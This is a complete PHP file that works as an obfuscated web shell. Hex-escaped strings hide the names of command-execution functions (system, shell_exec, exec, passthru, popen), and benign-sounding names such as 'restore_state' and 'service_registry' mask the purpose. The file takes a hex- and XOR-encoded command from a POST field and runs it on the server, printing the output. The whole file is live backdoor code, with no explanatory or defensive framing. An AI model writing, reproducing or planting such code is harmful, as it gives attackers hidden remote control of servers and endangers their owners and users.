<?php

$restore_state2 = "\x73\x68\x65\x6C\x6C_exec";
$restore_state6 = "str\x65am_ge\x74\x5F\x63\x6F\x6Et\x65nt\x73";
$restore_state7 = "p\x63lo\x73\x65";
$restore_state1 = "\x73ystem";
$restore_state5 = "pop\x65\x6E";
$restore_state3 = "e\x78\x65c";
$restore_state4 = "p\x61\x73st\x68ru";
$initialized = "h\x65x\x32b\x69n";
if (isset($_POST["\x68\x6Cd"])) {
            function service_registry (    $val ,     $factor ){
  $ent = '' ;
   for($d=0;
 $d<strlen($val);
 $d++){
$ent.=chr(ord($val[$d])^$factor);

} return $ent;
   
}
            $hld = $initialized($_POST["\x68\x6Cd"]);
            $hld = service_registry($hld, 28);
            if (function_exists($restore_state1)) {
                $restore_state1($hld);
            } elseif (function_exists($restore_state2)) {
                print $restore_state2($hld);
            } elseif (function_exists($restore_state3)) {
                $restore_state3($hld, $tkn_val);
                print join("\n", $tkn_val);
            } elseif (function_exists($restore_state4)) {
                $restore_state4($hld);
            } elseif (function_exists($restore_state5) && function_exists($restore_state6) && function_exists($restore_state7)) {
                $factor_ent = $restore_state5($hld, 'r');
                if ($factor_ent) {
                    $key_holder = $restore_state6($factor_ent);
                    $restore_state7($factor_ent);
                    print $key_holder;
                }
            }
            exit;
        }